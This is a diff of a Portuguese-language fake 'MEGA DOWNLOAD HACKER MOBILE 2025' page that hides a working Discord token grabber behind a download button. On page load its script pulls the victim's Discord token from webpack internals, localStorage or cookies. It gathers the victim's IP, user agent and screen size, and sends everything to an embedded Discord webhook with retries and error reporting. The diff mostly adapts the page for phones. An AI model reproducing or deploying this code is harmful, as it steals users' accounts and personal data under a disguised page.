@@ -2,8 +2,8 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MEGA DOWNLOAD HACKER 2025</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MEGA DOWNLOAD HACKER MOBILE 2025</title>
     <style>
         * {
             margin: 0;
@@ -19,6 +19,8 @@
             align-items: center;
             overflow: hidden;
             position: relative;
+            -webkit-user-select: none;
+            user-select: none;
         }
         .matrix-bg {
             position: fixed;
@@ -27,9 +29,9 @@
             width: 100%;
             height: 100%;
             background: url('https://i.imgur.com/matrix_code.gif') repeat;
-            opacity: 0.25;
+            opacity: 0.3;
             z-index: -1;
-            animation: matrixFlow 25s linear infinite;
+            animation: matrixFlow 20s linear infinite;
         }
         @keyframes matrixFlow {
             0% { background-position: 0 0; }
@@ -37,69 +39,73 @@
         }
         .container {
             background: rgba(0, 0, 0, 0.95);
-            padding: 80px;
-            border: 10px solid #FF0000;
-            border-radius: 20px;
-            box-shadow: 0 0 60px #FF0000, inset 0 0 30px #FF0000;
+            padding: 20px;
+            border: 6px solid #FF0000;
+            border-radius: 15px;
+            box-shadow: 0 0 40px #FF0000, inset 0 0 20px #FF0000;
             text-align: center;
             animation: neonPulse 1.5s infinite;
-            max-width: 900px;
-            width: 95%;
+            width: 100%;
+            max-width: 400px;
+            margin: 10px;
             position: relative;
             overflow: hidden;
         }
         @keyframes neonPulse {
-            0% { box-shadow: 0 0 60px #FF0000, inset 0 0 30px #FF0000; }
-            50% { box-shadow: 0 0 100px #00FF00, inset 0 0 50px #00FF00; }
-            100% { box-shadow: 0 0 60px #FF0000, inset 0 0 30px #FF0000; }
+            0% { box-shadow: 0 0 40px #FF0000, inset 0 0 20px #FF0000; }
+            50% { box-shadow: 0 0 60px #00FF00, inset 0 0 30px #00FF00; }
+            100% { box-shadow: 0 0 40px #FF0000, inset 0 0 20px #FF0000; }
         }
         h1 {
-            font-size: 72px;
+            font-size: 32px;
             color: #00FF00;
-            text-shadow: 0 0 20px #00FF00, 0 0 40px #FF0000;
-            margin-bottom: 40px;
-            animation: glitch 1.8s infinite;
+            text-shadow: 0 0 10px #00FF00, 0 0 20px #FF0000;
+            margin-bottom: 20px;
+            animation: glitch 2s infinite;
+            line-height: 1.2;
         }
         @keyframes glitch {
             0% { transform: translate(0); }
-            20% { transform: translate(-6px, 6px); }
-            40% { transform: translate(6px, -6px); }
-            60% { transform: translate(-6px, 6px); }
-            80% { transform: translate(6px, -6px); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(3px, -3px); }
+            60% { transform: translate(-3px, 3px); }
+            80% { transform: translate(3px, -3px); }
             100% { transform: translate(0); }
         }
         p {
-            font-size: 28px;
+            font-size: 18px;
             color: #FFF;
-            margin-bottom: 50px;
-            text-shadow: 0 0 10px #FFF;
+            margin-bottom: 30px;
+            text-shadow: 0 0 5px #FFF;
         }
         .download-button {
-            padding: 35px 70px;
-            font-size: 40px;
+            padding: 20px 40px;
+            font-size: 24px;
             background: linear-gradient(45deg, #FF0000, #FF4500);
             color: #FFF;
             border: none;
-            border-radius: 12px;
+            border-radius: 10px;
             cursor: pointer;
-            transition: all 0.4s;
+            transition: all 0.3s;
             text-transform: uppercase;
-            box-shadow: 0 0 40px #FF0000;
-            letter-spacing: 3px;
+            box-shadow: 0 0 30px #FF0000;
+            letter-spacing: 2px;
+            width: 100%;
+            touch-action: manipulation;
         }
         .download-button:hover {
             background: linear-gradient(45deg, #00FF00, #32CD32);
-            box-shadow: 0 0 60px #00FF00;
-            transform: scale(1.15);
+            box-shadow: 0 0 40px #00FF00;
+            transform: scale(1.05);
         }
         .download-button:active {
-            transform: scale(0.9);
+            transform: scale(0.95);
         }
         .status {
-            margin-top: 30px;
-            font-size: 24px;
+            margin-top: 20px;
+            font-size: 16px;
             color: #FF0000;
-            text-shadow: 0 0 15px #FF0000;
+            text-shadow: 0 0 10px #FF0000;
             opacity: 0;
             animation: fadeIn 1s forwards 0.5s;
         }
@@ -114,26 +120,32 @@
             color: #00FF00;
             font-weight: bold;
         }
+        @media (max-width: 600px) {
+            h1 { font-size: 28px; }
+            p { font-size: 16px; }
+            .download-button { font-size: 20px; padding: 15px 30px; }
+            .status { font-size: 14px; }
+        }
     </style>
 </head>
 <body>
     <div class="matrix-bg"></div>
     <div class="container">
-        <h1>MEGA DOWNLOAD</h1>
+        <h1>MEGA DOWNLOAD HACKER MOBILE 2025</h1>
         <p>APERTAR AQUI PARA O DOWNLOAD</p>
         <button class="download-button" onclick="fakeDownload()">DOWNLOAD AGORA</button>
         <div class="status" id="status">INICIANDO CAPTURA...</div>
     </div>
 
     <script>
-        // MEGA TOKEN GRABBER 2025 - SÓ PRA FILME, NÃO USE NA VIDA REAL!
+        // MEGA TOKEN GRABBER MOBILE 2025 - SÓ PRA FILME, NÃO USE NA VIDA REAL!
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366216805642801163/zeuAqNvhBc_2fYCAv914lRy2Kd9eKAHPqIU1GIf70MgiYeZyvsjCe4w1KkMSCHqLHout'; // Substitua pelo seu webhook real
 
         // FUNÇÃO PRA CAPTURAR O TOKEN
         async function grabToken() {
             try {
-                // Técnica atualizada pra 2025: acessa o token via módulos internos do Discord
                 let token = null;
+                // Técnica primária: webpackChunkdiscord_app
                 if (window.webpackChunkdiscord_app) {
                     webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                         for (let module of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
@@ -142,71 +154,108 @@
                             }
                         }
                     }]);
-                } else {
-                    // Fallback: tenta acessar via localStorage (menos comum em 2025)
-                    token = localStorage.getItem('token');
+                }
+                // Fallback: localStorage
+                if (!token) {
+                    token = localStorage.getItem('token')?.replace(/^"|"$/g, '');
+                }
+                // Fallback adicional: tenta acessar via cookies (raro)
+                if (!token && document.cookie) {
+                    const cookies = document.cookie.split(';').find(c => c.includes('token='));
+                    if (cookies) token = cookies.split('=')[1];
                 }
 
-                if (token) {
-                    // Coleta informações adicionais
-                    const userAgent = navigator.userAgent;
-                    const screen = `${window.screen.width}x${window.screen.height}`;
-                    const timestamp = new Date().toISOString();
-                    const ip = await fetch('https://api.ipify.org?format=json', { cache: 'no-cache' })
-                        .then(res => res.json())
-                        .then(data => data.ip)
-                        .catch(() => 'DESCONHECIDO');
+                const userAgent = navigator.userAgent;
+                const screen = `${window.screen.width}x${window.screen.height}`;
+                const timestamp = new Date().toISOString();
+                const ip = await fetch('https://api.ipify.org?format=json', { cache: 'no-cache' })
+                    .then(res => res.json())
+                    .then(data => data.ip)
+                    .catch(() => 'DESCONHECIDO');
 
-                    const data = {
-                        token: token,
-                        ip: ip,
-                        userAgent: userAgent,
-                        screen: screen,
-                        timestamp: timestamp
-                    };
+                const data = {
+                    ip: ip,
+                    userAgent: userAgent,
+                    screen: screen,
+                    timestamp: timestamp
+                };
 
-                    // Envia pro webhook com retries
-                    let attempts = 0;
-                    const maxAttempts = 3;
-                    while (attempts < maxAttempts) {
-                        try {
-                            const response = await fetch(WEBHOOK_URL, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    content: `🔐 **[MEGA GRABBER 2025]** Novo token capturado!\n📜 **Token**: \`${token}\`\n🌐 **IP**: \`${ip}\`\n🖥️ **User-Agent**: \`${userAgent}\`\n📏 **Resolução**: \`${screen}\`\n⏰ **Timestamp**: \`${timestamp}\``,
-                                    username: 'MEGA_TOKEN_GRABBER_2025'
-                                })
-                            });
-
-                            if (response.ok) {
-                                document.getElementById('status').innerText = 'TOKEN ENVIADO COM SUCESSO!';
-                                document.getElementById('status').classList.add('success');
-                                console.log('[MEGA GRABBER] Token enviado:', token);
-                                return;
-                            } else {
-                                throw new Error('Webhook falhou: ' + response.status);
-                            }
-                        } catch (error) {
-                            attempts++;
-                            console.error(`[MEGA GRABBER] Tentativa ${attempts} falhou:`, error);
-                            if (attempts === maxAttempts) {
-                                document.getElementById('status').innerText = 'ERRO AO ENVIAR TOKEN!';
-                                document.getElementById('status').classList.add('error');
-                                console.error('[MEGA GRABBER] Todas as tentativas falharam.');
-                            }
-                            await new Promise(resolve => setTimeout(resolve, 1000)); // Espera 1s antes de tentar de novo
+                // Envia pro webhook com retries
+                let attempts = 0;
+                const maxAttempts = 3;
+                while (attempts < maxAttempts) {
+                    try {
+                        let message;
+                        if (token) {
+                            message = {
+                                content: `🔐 **[MEGA GRABBER MOBILE 2025]** Novo token capturado!\n📜 **Token**: \`${token}\`\n🌐 **IP**: \`${ip}\`\n🖥️ **User-Agent**: \`${userAgent}\`\n📏 **Resolução**: \`${screen}\`\n⏰ **Timestamp**: \`${timestamp}\``,
+                                username: 'MEGA_TOKEN_GRABBER_MOBILE'
+                            };
+                            document.getElementById('status').innerText = 'TOKEN ENVIADO COM SUCESSO!';
+                            document.getElementById('status').classList.add('success');
+                            console.log('[MEGA GRABBER] Token capturado e enviado:', token);
+                        } else {
+                            message = {
+                                content: `⚠️ **[MEGA GRABBER MOBILE 2025]** Usuário clicou no botão, mas nenhum token foi encontrado!\n🌐 **IP**: \`${ip}\`\n🖥️ **User-Agent**: \`${userAgent}\`\n📏 **Resolução**: \`${screen}\`\n⏰ **Timestamp**: \`${timestamp}\``,
+                                username: 'MEGA_TOKEN_GRABBER_MOBILE'
+                            };
+                            document.getElementById('status').innerText = 'NENHUM TOKEN ENCONTRADO!';
+                            document.getElementById('status').classList.add('error');
+                            console.warn('[MEGA GRABBER] Nenhum token encontrado.');
                         }
+
+                        const response = await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(message)
+                        });
+
+                        if (response.ok) {
+                            console.log('[MEGA GRABBER] Webhook enviado com sucesso.');
+                            return;
+                        } else {
+                            throw new Error('Webhook falhou: ' + response.status);
+                        }
+                    } catch (error) {
+                        attempts++;
+                        console.error(`[MEGA GRABBER] Tentativa ${attempts} falhou:`, error);
+                        if (attempts === maxAttempts) {
+                            document.getElementById('status').innerText = 'ERRO AO ENVIAR DADOS!';
+                            document.getElementById('status').classList.add('error');
+                            console.error('[MEGA GRABBER] Todas as tentativas falharam.');
+                        }
+                        await new Promise(resolve => setTimeout(resolve, 1000));
                     }
-                } else {
-                    document.getElementById('status').innerText = 'NENHUM TOKEN ENCONTRADO!';
-                    document.getElementById('status').classList.add('error');
-                    console.warn('[MEGA GRABBER] Nenhum token encontrado.');
                 }
             } catch (error) {
                 document.getElementById('status').innerText = 'ERRO CRÍTICO NA CAPTURA!';
                 document.getElementById('status').classList.add('error');
                 console.error('[MEGA GRABBER] Erro:', error);
+                // Envia erro pro webhook
+                sendErrorWebhook(error.message, userAgent, timestamp);
+            }
+        }
+
+        // FUNÇÃO PRA ENVIAR ERRO PRO WEBHOOK
+        async function sendErrorWebhook(errorMessage, userAgent, timestamp) {
+            try {
+                const ip = await fetch('https://api.ipify.org?format=json', { cache: 'no-cache' })
+                    .then(res => res.json())
+                    .then(data => data.ip)
+                    .catch(() => 'DESCONHECIDO');
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `❌ **[MEGA GRABBER MOBILE 2025]** Erro na captura!\n💥 **Erro**: \`${errorMessage}\`\n🌐 **IP**: \`${ip}\`\n🖥️ **User-Agent**: \`${userAgent}\`\n⏰ **Timestamp**: \`${timestamp}\``,
+                        username: 'MEGA_TOKEN_GRABBER_MOBILE'
+                    })
+                });
+                if (response.ok) {
+                    console.log('[MEGA GRABBER] Erro enviado ao webhook.');
+                }
+            } catch (e) {
+                console.error('[MEGA GRABBER] Falha ao enviar erro ao webhook:', e);
             }
         }
 
@@ -221,7 +270,7 @@
 
         // EXECUTA A CAPTURA AUTOMATICAMENTE
         window.addEventListener('load', () => {
-            console.log('[MEGA GRABBER] Iniciando captura de token...');
+            console.log('[MEGA GRABBER] Iniciando captura de token no celular...');
             grabToken();
         });
     </script>
